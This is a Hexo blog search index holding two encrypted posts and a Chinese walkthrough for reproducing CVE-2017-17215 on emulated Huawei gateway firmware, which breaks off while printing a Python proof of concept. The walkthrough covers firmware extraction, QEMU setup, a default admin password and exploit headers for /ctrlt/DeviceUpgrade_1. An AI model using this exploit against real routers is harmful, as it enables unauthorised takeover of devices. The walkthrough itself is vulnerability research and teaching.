<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>从进程注入到提权</title>
    <link href="/2022/06/26/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"/>
    <url>/2022/06/26/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="再试试nc看看" data-whm="禁止修改">  <script id="hbeData" type="hbeData" data-hmacdigest="e655a24e8acb8476c6e1a922f443212b60d5476226df1ab807977e9e778687b7">cc0c0f8ba411acd26894e584ac9b5fda28350dbdee232506489de47537a1ee010219adebb29445624d2725110431a2ec9a554815281e020b8a338e8925a52fe628f0fa47bed5b428e6c660b25c6ee1b7a3f80e0cfa361acc12944fdcbc39a8349d1d1bff3b6f2dafa5f2b63cdfd348bbcfd86e146311d3da8c39cf5d70c0c2f74995d5bbd3bcb8f459ffc4d21a40f0f33263b05a5bf4876b1a7f10e233532073a6ddf5dffc60db285e06542da50a131cde43422d70e38b0f9d3113bdb89e198607590316471d4aae6791de948c975d0ec64be3e811c0e6027404e012557b3ea0acdea3aa82b4254013f409f5183a0e7fbfb68d32434213eefd383209ebf219392c5b417982562fdd6f555b1bf34a51d77ec4d193f4422865950d88692cb2833fd53a5f1ce0467e97b81281576fd9febdb88f1c8cbd7d0ecc9b4237a9836c4a4007919477bcc698230ab93aadd690463a9fb2aab7ed2b263d20c75941cfb204116f9fe85e7d48968dd43c6c0baa6803c53001136b254a76cad40060c38bc6930d8e10d89277ba5ac2c23101b47bddaad3b1b20982e82c02ce37233c54d19bd5875a200b4130188f3fe87feade20a83e49ef61ea08a93529328fabe1710eee9e5b903b74e182d043fd8a140c9f4dba3ad614e0a3e2ca6396a7a40f67bbdc84624695f14f076a790eb6d44d6bca3a39384765e8279a5f92019b202f2fed2ab671d61d9706b82c20fd472b959b349a98ca59a74bafb99c205a29fa0ba8e16f27980e38e5d7ba268d47b0449b8360e6d72b13ed137c2af6d2ca637da54492ae502e7965d0672ad0a864c5d9bebb2f4238df7ecc2cf0fcef918867cbb3ba87ba800b8361bf9d756f24bd4de7c39265f5bd4c47b40f327e8e34ab99be4345fc3e964e8c1268ab64121a0ac61435d6e90a6d866822c824c57a07e2ff965631464fe64e0b450f61723634ef06cb48b9798d0bf92ec55fcf254380e04ed6821539177905f65cb04a5ddabba8784f87c17b4354a45fcb4540caa57e36e9e0ade136a0853b7ddadb5d8fd0d9822390b94d08826b2d925ee054a8f7b4bf5b21d42e29531792976fa936215aad63a595227dd04255825a462ade3bf0037a3af95fa5b5feae6d2b08ddc0e9bfae22554affab1a40767b3c4c9a21108dab44739f00ad06c45eadadc8a3016782f521ff553392807f4fbe533a593e2ea356f2cb42633cb463c8840b403710942443c9e4147b467e2344b62946f114c25b1c6798f04b05e72678dd2fab6f612d462aa0b9cc85207ce39e9c1c9b3926c2fbbed62d7847783048d3f6418764a71d67f30149ed5af900bf7929c993f64b85d5bb69dff6cdd975c5a67549e378ccaa350feb5f23d3928799da7161fbd811e5a9b7d03b139fc783b2c0e74d5656880a9c9481e4245fe54fb7305b785966cdcc6faa6f1852f5793ef06b90fe97f0026611148f2667991d62f521d208492e71ab09724074efd963517d2bac394c32f6576c3f9801df4681753a0d46be067e6478aa80e3d92e156fba268e94526dd20dce86ace1b95e18910f1674387b006aad6b4ea4143f7666f9c10b1e47807d770033498fee866890a82680de34209272208577a53017710227b8be4038d268dc5e406b25157a402f6057427ad65c7bfea97557efe36bc35382ba7634fa3599ef9f7c164c75ff179183da4cb194bd4470a0086db582295ad1f1aa245f7ec15af6214c1331f09f848c3d68f38be39fe6263374b6d8bc93670e8017d3b4596d46a937ff7df3c416ad98febb4cd3d38c032a863441d0f565d4b8f7597e80fdaa5e2fc29c792cecffa3018353a06904d0c3a85c03608648c8adb2b3514d0de4678af8d756e120ad606e816e04fbbb3a24f61ac157f28413fdaf2b15e01cbf8648f7871ae00a7dcce4ef5d9d30f50b11603939beff5a9a7d1e1aad6869b67360530e0a74afdbfb76589c9324a6cbb79789a0b610d1a01e944a09427b7e21f68ea29ec6f911e9dabd2ae4fa15fd0f27ac7b1469ac78cdae36d3f90e17022667b5043069d46b85fc1d051a43593c471b66efbe32583abe5e77934474cd70cf9c8638c2b03c9ccb60a50f7a424c58c44e8180</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">chat nc 43.96.147.93</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>好怀百岁几回开</title>
    <link href="/2022/06/25/%E5%A5%BD%E6%80%80%E7%99%BE%E5%B2%81%E5%87%A0%E5%9B%9E%E5%BC%80/"/>
    <url>/2022/06/25/%E5%A5%BD%E6%80%80%E7%99%BE%E5%B2%81%E5%87%A0%E5%9B%9E%E5%BC%80/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="再试试nc看看" data-whm="禁止修改">  <script id="hbeData" type="hbeData" data-hmacdigest="b0ec96c9e80e113f8a042cf4db3a4cfa5f83f218cde418c1898b44f037ef460c">cc0c0f8ba411acd26894e584ac9b5fda8b1dff880871afe6e43cf0d453c5369626edc82f20db218462ab795b986be0e1e3a75c8aa2169ad7d396023f00d3a0a41178c14531e052334812dce2b1ae5ae142ee68a6bfeb66bf51666b5a727caae0066d137e16b45fc41972d9bd15692c931827903324a77bbe57cea2ba9e154f0e60621540964ec127fd35853155d01d90b332874a0627e8baca858247ff16b47e0aa378a71f11ff40d35f2748d4c240e816e0ec814ecf809fb63203b607816c1c8b9f71bd111dee70c447e1cd19427baf57220568b5d6845756fc1733e2e0385bb15c42fc3d43f448d7af0241f248a1bc0982e56228f84a96ca5a0f695a1754fdf6a78fa70b27bbce0cafe8906c2ac80ce4e6f870a0c2b58c7f21d5e113713c0f8508501836184c7125282a8b3ca9d3288e8c18bbc433c491c88570c3056765a4c52f3637d36b94f522f4741d07598a12c6170e05b4df38438659705eccc049f1e9c17e34ec060bc6bdbbb6c8cc1b6e8b4e7aa0e267f3082753fd222f64615b3dd7e1b974d48780dfda239172fdcc06ac44366a413082e8ab9d5423fd32d86ff1835372e12c3e7459cf196a8001a8a32c331d04fc205eb59c01a108882cd18c82f29dfdd2ef9389e9cdd516820d2d70743d4efa8314fd7784d1c217fca1a02d89f158a16cc2a296c20bb585a3f06d4dc75558ff78aa9e15c3037f8eadf063c2f9fa72caf167ae5f3cc7c7b4bc1793552b46798b8b719c7cdd0923cd0e79292129eb99938a3844f5101c6319876ee93b842a21e7bc3ddcf48c7da3a57f467cac9a82575bfa475c1e90485aa4740270bc9c6cfd213eac8ea17b938f28e3b676c776011c96e0ea7bcd36cd4e80da275940aa745fcacfe69d79e7ffa73798abf20a88b3b00a2100ddf4bf813cbbb370a534c2ea397bc34ebef2059093065e4ce64aa0e6b4ef31eee1000933b3fbe8957f37ae70f8df58df1660dbe76dfd908e4d2f2bc276beb3b82c27a2ff12e9550cdc1e49e95df212fdcc26c7324b41385e75145544d585dd2a5d0ca3bf600432bdd47b9907822c642d8cf220602f6e1842fb4024f50aa80f7b01ff733f638b49bdef1f5159bc93827cba3967cacdc7d350a1f0b2f2aeeb76906b5e7ca59f6224bcc5c3b7f1850d0653685aef8c5957f3e81a5bc8be428fd2ac0dac69a7654c1e3bcc04eb8ddbea81f9343adae78d67e4f676d156396334da06abf31f7ccbd26e1a2bd23fa0422e14d4b85558bc046ce14a4ba950c3c617f00650995b0f5d38ac6c31b21d07e9011998a5f41c5e7854d0aafdd768ef0e04d9b9a4217828e386f1c9fd2080662ab654d4d2538964465a47da7b33ecd52a4b0230ad20235930d74aab1beb541cf98dad488d61c5e6745771538bcda9b389f2a4b062eda503a6c95d145f23bc4774110c600c030dbd837f447df8259eecbb6eb6fa597fe55be156ed963b4c5c3d649a018b138f2772906580959af5766ae47f0bb52864aa7a2baff48c642bb15dba639986e751dfa6c2e59fb773412ade44ac103f139301cd41049a2f853384498783d078fe01681f688d8db7fa9aef7173bbd3cd5fddad8f819ce766487fc7f7bc5e5ded8cbbe04c7056b63181ea2a4ac6a2f6c0070be5550b94af727212ed28ba71c3fe89c6ed48060b516d1d16330d60529421ee57e8c4b23f44e4098eb127008b457df179304612d702739054052c163f7f2908dd8147619ae75ad2a0cea057705497ad1bfa20aae2e94c610671f1acba51b7ec8f411423bb27d6b03a3c8bb8a9972ff3b92f14cad98cac3912293590a727e72722fdcd0819237a74d453d787ac9eb22a31d0266a1413c32c2ec981f5c7699db92d6f30383565088dadc58d179c74bcfaacf5da8649311adeaa1119bfcd00c09fa99b26089b0ac2b5ebe7ab2aed7183805d2d553a46e226db387d63ebe08e2dd04e6d2f7d3990b0fe31c147c214aba30cf13cbb6aafd49d90eba04c743204d248d3eb930043e62c9ed3ad9cfee41ba9da724e7f96b5ce97f6d0d2af21f87651897121f71f6e5819395b71dbfece4015610ce93be9e5c733d16ea128e8b86e8b703adc14c54e9a9bd508c4f7245bd90f344abc914e414677946383f36e0f7cba0214dc1906bfd97e09aa09fd8c9dd765eaf4d036a277587d6a83e77057913c47d519aa7a4e47b3ea7f3c964e868b0dd169311e76578aa7aba67e05fa3c506e404ce1f2f1b16f295dccaf9867250a48ef0ff02cb0c1d0a7686e6ef24a6984f4677cbca7ba29bdc3e929b0bc3576734b278b4fa8fd3380d5d099c03e07fba56f0a15794497a048d3210f862235d6e2f8a516123e751cc2a5d7f498b2d6903a1d523ea1e1414cda393536da2077e603431ef232a31e88f2e350811b97e7bf28da71a4cc42498a78bbcc0f808c30a1b5331d3196767f19e72a616ad4c5dede82ac78c7efbaeeafa2ef209d36810a293dac20496397dc01d56a4b10f14b9e7695b90bf316b350e744b492de9aafa70097a9075554ee0b2a5a8d06d64ea04222269b234c2d4c0d2b54a48659da221fcb6dd205b318eb1cc7ece13b88563b6f627129038d04ff6a6d8322733c83c9037a55f3c8de9a44ba08cbe665bc928e7b8114c593af7fe3c87fec5ce5da9b83786f5cc65972740fea9171a9ecbc02f273a377051589a5bdf60c76e9ba408a089db9bbe826c9ce6c63a65e690a3c2ebb938a9da165e50658dae09d67887df8df813da4107d2880b61c9ffc26a60c41ff4d6a93accb9f67fd469047a75cbba4acc10a49253ee391a967b5e61edd0e26094241146d4393f519908a7e0bee45eba0c352b0ebf35088f6a646f2bf45e4410e56b13398a0ec780b3758f55c7d65f71ea08e98b81a4104f901ed7827f85a0a79b5f946408953d894152df38830e11002532918b9e8d0c20b09530c8b1dd4af8f0d185b9e447ec4f22c48cd4bda5502e4f0a30b14fadf526214ed68bc46e20e0350422654b45c92eb6787b8f071ce87831ad4cf1a4865481f3bd3a213807184118eb14df3c712b88d5d70671bea06ff115373643ec6323f2ba82d21282fc01ec022de936d3caea2f73025e1939ab01b3b9da4f13ca87d78a125ae416ee0e56ed9c656e243719d4db18b95d4fb965f3399df320fcce15622beadde20767e50cbb36d94f926c3b8aaa47a787da6d6c226355a43fcb18d14e1847d740120f861be604382e8c703573404fc9f37c55c2b82bdbfec51edca8f2c83a03bb3680f51161e2cd931dbf2bc116e9fd8b1a3f09bacd5614cba987bb8936c638f7df629a41ab2cc4236cdd3fe5af14c9cdf6c63d14ed81bedb9b395fd923657edaed7bf1565137520586ca4b83378b08827a0807eb377dc42cfaa38ab10768071fc8146ad1d9df149554dc20d5aeff18ca051064d742e9ecc69d53094be759b4c5ecd951c3ccf344449a9e94c6afac622bf13c93f9573aa0debdd5aaa28074eaf5881d181cfc5710835a52fbc40b8d81f2bf880ce4c942a5b483057528bd82d07da86cd2024c6e8cd40af35571faf9336d9474af2c36f98c2e2606235f0bdad9fa6be09342feb759d024ff8409fdcf81a304408a8d67b6790e320b8cae0c528ce94963c1f6921d3049acb7c5fd1231b8bf08d5feac3ef09ee2f9df066d2075d28f17e2febca6878ca5cd8d96268b4f77fbdab02d0981951523e9c76c7e7da51a5a2f4b05af48832c7e0e68d838592906c1e4ce43450fc82e4da4be36282defd01265dda6316bb211e12ec1077d0ae2d78ebc273f93136b81a33db4d454947ed017767705510c8e3d6ad4e6db09900d914511549892365fc4d5b5250cb1392e62adfe84c4537278e62cf9a089371df054c1a9a176be20be83d19a45ee9355d8f6a9624e5db5a3104a648b7603763506f62caf20fcc6739341ae430cb25fa9f84e1a6ac9df9dfac2e0ea743b054463350f6e8ce1805bb02928d9096cac369864f7924ffc57b7b81508f94da63dade05d420acd29c97d27f92af237442f581e1b9a2a96411c351213a32c0ad633a52eaa8d0cac9ef8ff26e9bc8015043c3106ef06d6a1e95a0bc3a3b1d7754fb40bc0c2c4ea4b554709d7db4ff40def2d6552f5aa0715a57880c74d8cbe84d0742ebb2e29b1dc9e00fb2d70e6946eabcde357ec30cb72098f9fa36b96af64ce99a43efceb2708a0ad21a34f9d6e500da54d6b6c6c4e5fb970b42ef6f8e04bc75fe0581bd5bb2cb5018506cac5be19e1cbf6056969a0b069668d38b4e281fec92b45b2086ff74a5aea0828877627071efac78dc10a6d7c3666afa4af742a217475c6f6c3e92c447ad734956b2c96a515243cb82f03cc3a40f668cd3aa651c956b5a83fef491a49a396156782122f8031bc4c6fbb628871c357edaf58e64d902f429d0cbee1756b0b4010e40e3e0cfa1d40e1d5c6e1a27f39544946c73976fed2054aa4be0b9cd24a56e356f53f287c17500c5321b0b2e6260d41b2a4503dd88d1189de3ab34a5efbfcc4f1183be262de5adc7b526dda1af343cc1606b09ef2227cb1d38586aef4ffc9451f0c6d80243fa956b02a0238f3bb3d092fdc2242c1f834f64810a142ec3d5133045686976036a25166124315fb0598394c28ed792eae98ce5206b7186d9041edddb4051c323a2f311dbebd1ea9f6559472ebba42d02780f2cbdd83bf1d4eb743576177b3f797a343ad44d2128b94d33a6f1a9fe0f59d761f75ac7ac7d041ea89aa8ee3b2a07c61acddfa00b0a95caa73300ac9268503f3f5a2a0fc7f44c96b1d04cac3e8220d913357281dc3562c09ddb5de59f9690b16fb9fed0cc20eb2be8b367748a7d26ebef78a2ff5d966aed212b1c5dc794e4b15871c5c7b5ca8ea8ff465c0477a021ab66c9c58e82ca6529c39581b053c8347e2e1c74cca1b7552f3e0d55786e0f111827a2f3b11b6be60b512e304967775ad9aa69e57e43b327a925416c2f74971c3247fa95465ba60ae8397ac0ff5c2cf4ecf5e678b30b4218db4df805afc57df270e7af42cd623fd50e2b302b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">chat nc 43.96.147.93</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>chats</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2017-17215复现</title>
    <link href="/2022/06/23/CVE-2017-17215%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/06/23/CVE-2017-17215%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于合天网安实验室，链接时间太久忘了。</p></blockquote><p>😈远古时期学习路由器固件分析，并尝试复现了一个简单的CVE。中间遇到了很多的坑点，虽然把漏洞复现了，但是过程可谓曲折。</p><p>ps：该文章以复现CVE-2017-17215为基础，提供一个详细的固件分析入门手册。</p><h2 id="0x01-环境准备"><a class="header-anchor" href="#0x01-环境准备">¶</a>0x01 环境准备</h2><p>环境准备是分析固件的基础。手里的环境是ubuntu20，中间也尝试过过kali2020。<strong>期间尝试过自动化工具Firmadyne，以及其plus版本</strong>，但是都失败了，这里一些师傅那里得到建议，Firmadyne工具的镜像和内核太老了，建议手动换新的，此外该自动化分析工具其实也有较大的局限性，所以我建议<strong>手动配置一个固件模拟环境十分有必要</strong></p><p>下面是环境的配置过程。</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">ubuntu20 python2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="Binwalk安装"><a class="header-anchor" href="#Binwalk安装">¶</a>Binwalk安装</h3><p>Binwalk是一款优秀的固件提取工具，我们拿到手的，需要分析的固件大都是bin文件，这时候BInwalk工具就起到了从中分析出文件系统的作用。</p><p><strong>apt下载的和kali自带的Binwalk</strong>缺少部分重要的分析插件，建议手动编译安装，避免固件分析失败。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> remove binwalk  //如果有的话，先删除旧版的Binwalk<span class="token function">git</span> clone https://github.com/devttys0/binwalk //从git上获取binwalk<span class="token builtin class-name">cd</span> binwalk<span class="token function">sudo</span> python3 setup.py <span class="token function">install</span> //Binwalk使用python3编译安装//如果是python2环境，就需要先安装以下依赖<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-lzma<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>如果git出现问题可以尝试把<code>https://</code>改成<code>git://</code>，等待编译完毕即可完成Binwalk的安装。</p><p>然后安装一些其他的依赖。<br>Binwalk uses the pycrypto library to decrypt some known encrypted firmware images:<br>Binwalk提供分析一些加密固件的插件，但是用到了pycrypto库，所以我们还要再安装一下该库。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Python2.7</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-crypto<span class="token comment"># Python3.x </span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python3-crypto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>Binwalk提供图片和视觉分析。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Python2.7</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libqt4-opengl python-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip<span class="token function">sudo</span> pip <span class="token function">install</span> pyqtgraph <span class="token comment"># Python3.x</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libqt4-opengl python3-opengl python3-pyqt4 python3-pyqt4.qtopengl python3-numpy python3-scipy python3-pip<span class="token function">sudo</span> pip3 <span class="token function">install</span> pyqtgraph<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>Capstone disassembly framework的插件运行需要的python模块如下。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Python2.7</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-pip<span class="token function">sudo</span> pip <span class="token function">install</span> capstone<span class="token comment"># Python3.x </span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python3-pip<span class="token comment"># Install standard extraction utilitie</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> mtd-utils <span class="token function">gzip</span> <span class="token function">bzip2</span> <span class="token function">tar</span> arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools<span class="token comment"># Install sasquatch to extract non-standard SquashFS image</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> zlib1g-dev liblzma-dev liblzo2-dev  $ <span class="token function">git</span> clone https://github.com/devttys0/sasquatch  $ <span class="token punctuation">(</span>cd sasquatch <span class="token operator">&amp;&amp;</span> ./build.sh<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>以下的选择性安装即可。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Install jefferson to extract JFFS2 file systems</span>$ <span class="token function">sudo</span> pip <span class="token function">install</span> cstruct$ <span class="token function">git</span> clone https://github.com/sviehb/jefferson$ <span class="token punctuation">(</span>cd jefferson <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> python setup.py <span class="token function">install</span><span class="token punctuation">)</span>  <span class="token comment"># Install ubi_reader to extract UBIFS file systems</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> liblzo2-dev python-lzo$ <span class="token function">git</span> clone https://github.com/jrspruitt/ubi_reader$ <span class="token punctuation">(</span>cd ubi_reader <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> python setup.py <span class="token function">install</span><span class="token punctuation">)</span>  <span class="token comment"># Install yaffshiv to extract YAFFS file systems</span>$ <span class="token function">git</span> clone https://github.com/devttys0/yaffshiv$ <span class="token punctuation">(</span>cd yaffshiv <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> python setup.py <span class="token function">install</span><span class="token punctuation">)</span>  <span class="token comment"># Install unstuff (closed source) to extract StuffIt archive files</span>$ <span class="token function">wget</span> -O - http://my.smithmicro.com/downloads/files/stuffit520.611linux-i386.tar.gz <span class="token operator">|</span> <span class="token function">tar</span> -zxv$ <span class="token function">sudo</span> <span class="token function">cp</span> bin/unstuff /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>以上是手动安装所有库的过程，如果想要省时间，也可以尝试一下Binwalk的安装文件夹中的自动安装脚本，<code>sudo ./deps.sh</code>，但是这样的安装耗时较长，且容易报错，建议还是采用手动安装需要的几个依赖即可。</p><p>安装好了之后，可以尝试一下分析固件。<br><code>binwalk -Me 固件</code><br><img src="https://i.bmp.ovh/imgs/2022/01/7ad77b1b981aee35.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/01/20586cf2af94373f.png" alt=""></p><p>在当前的文件夹下即可得到文件系统的根目录。<br>通过<code>file ./bin/busybox</code>的指令即可得到相应的文件架构。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">file</span> ./bin/busybox./bin/busybox: ELF <span class="token number">32</span>-bit MSB executable, MIPS, MIPS32 rel2 version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>至此Binwalk安装完毕。</p><h3 id="Qemu安装"><a class="header-anchor" href="#Qemu安装">¶</a>Qemu安装</h3><p>相对于Binwalk的手动编译，Qemu相对简单一点，稍微有所了解的同志可能会知道Qemu有系统和用户模式两种。安装的话可以选择不同的需求安装，这里我们选择全部都安装。</p><p>Qemu的安装没有很多讲究，一键脚本安装即可</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone git://git.qemu.org/qemu.git<span class="token builtin class-name">cd</span> qemu<span class="token function">git</span> submodule init<span class="token function">git</span> submodule update --recursivesudo<span class="token function">apt</span> <span class="token function">install</span> libglib2.0 libglib2.0-devsudo<span class="token function">apt</span> <span class="token function">install</span> autoconf automake libtoolcd qemu <span class="token operator">&amp;&amp;</span> ./configuremakesudo <span class="token function">make</span> <span class="token function">install</span>//apt 安装<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-user-static<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-system<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu-user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>安装完毕之后，如下图<br><img src="https://i.bmp.ovh/imgs/2022/01/d4c999e08069c699.png" alt=""></p><h2 id="0x02-漏洞验证"><a class="header-anchor" href="#0x02-漏洞验证">¶</a>0x02 漏洞验证</h2><p>工具安装完毕之后，以下将对漏洞进行验证。</p><h3 id="启动服务"><a class="header-anchor" href="#启动服务">¶</a>启动服务</h3><p>首先，需要给Qemu虚拟机准备一个新的网桥，利用该网桥使得Qemu机可以联通互联网，并且和VM虚拟机处于同一网段。</p><p>采用的基本方法是分配一个新网卡给Qemu机器，并且使用网桥，将其桥接到原来的网卡。首先需要安装网桥配置工具。</p><p><code>apt-get install bridge-utils</code><br><code>sudo apt-get install uml-utilities </code></p><p>然后使用下面的脚本即可。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/sh</span><span class="token function">sudo</span> brctl addbr br0 //创建网桥br0<span class="token function">sudo</span> brctl addif br0 ens33 //连接到ens33<span class="token function">sudo</span> <span class="token function">ifconfig</span> br0 <span class="token number">0.0</span>.0.0 promisc up<span class="token function">sudo</span> <span class="token function">ifconfig</span> ens33 <span class="token number">0.0</span>.0.0 promisc up<span class="token function">sudo</span> dhclient br0//给该网桥分配IP地址，此前不能给ens33分配ipv4的地址<span class="token function">sudo</span> tunctl -t tap0 -u root<span class="token function">sudo</span> brctl addif br0 tap0<span class="token function">sudo</span> <span class="token function">ifconfig</span> tap0 <span class="token number">0.0</span>.0.0 promisc up<span class="token function">sudo</span> brctl showstp br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>以上内容保存到一个bash脚本即可，开启虚拟机之前运行一遍。<br><img src="https://i.bmp.ovh/imgs/2022/01/17975a3eca5dd634.png" alt=""></p><p>网络配置好了之后，使用相应的镜像和内核文件启动一个qemu机。<br><a href="https://people.debian.org/~aurel32/qemu/">https://people.debian.org/~aurel32/qemu/</a><br>以上网址可以下载内核和镜像。</p><p>期待使用指定的网桥，且在当前中断开启qemu机器。<br><code>sudo qemu-system-mips -M malta -kernel ~/Desktop/IOT/vmlinuxs/vmlinux-2.6.32-5-4kc-malta -hda ~/Desktop/IOT/Images/debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</code></p><p>指令的具体含义可以看以下Qemu的说明文档。<a href="https://wiki.archlinux.org/title/QEMU_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/title/QEMU_(简体中文)</a></p><p>虚拟机的root账户密码是root，成功登录之后，尝试ping以下外网，看能否ping通。<br><img src="https://i.bmp.ovh/imgs/2022/01/2b3815aba7ca25ec.png" alt=""></p><p>然后使用scp指令，把文件系统都传递给Qemu虚拟机。<br><code>scp -r 路径 ip@username:虚拟机路径</code><br><code>$ scp -r squashfs-root  root@192.168.146.137:~/sqashfs-root</code></p><p>文件传输完毕之后，为了能够让VM机访问到Qemu机，使用mount挂载以下dev和proc</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> -o <span class="token builtin class-name">bind</span> /dev ./squashfs-root/dev<span class="token function">mount</span> -t proc /proc ./squashfs-root/proc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>不同的文件系统有不同的挂载指令。</p><p>此时注意到<code>CVE-2017-17215</code>的漏洞存在于<code>upnp和mic</code>服务中。这两项服务都和网络有关，为了方式漏洞服务启动后，网络环境的变化，使用ssh远程登录该Qemu机器，新建一个console，利用该console启动漏洞服务，利用原有的Qemu窗口保持Qemu的ip不发生改变。</p><p>在ssh窗口输入<code>chroot . /bin/sh</code>更改根目录，避免动态链接库报错。<br><img src="https://i.bmp.ovh/imgs/2022/01/b47cbc250d9e899d.png" alt=""></p><p>然后执行漏洞服务即可。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ./bin/upnp</span><span class="token comment"># ./bin/mic</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>等待执行结束，果然ip发生了改变，利用ifconfig指令把ip地址改回去。<br><img src="https://i.bmp.ovh/imgs/2022/01/a4a0a7d9ee1cb49f.png" alt=""></p><p>此时，尝试访问该路由器（Qemu机）的ip地址，可以发现成功访问。<br><img src="https://i.bmp.ovh/imgs/2022/01/f329dee4d718e098.png" alt=""></p><p>默认账户admin，@Hua1234</p><h3 id="poc测试"><a class="header-anchor" href="#poc测试">¶</a>poc测试</h3><p>漏洞服务开启之后，可以验证以下漏洞的poc，用的是下面的exp</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string">"Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, 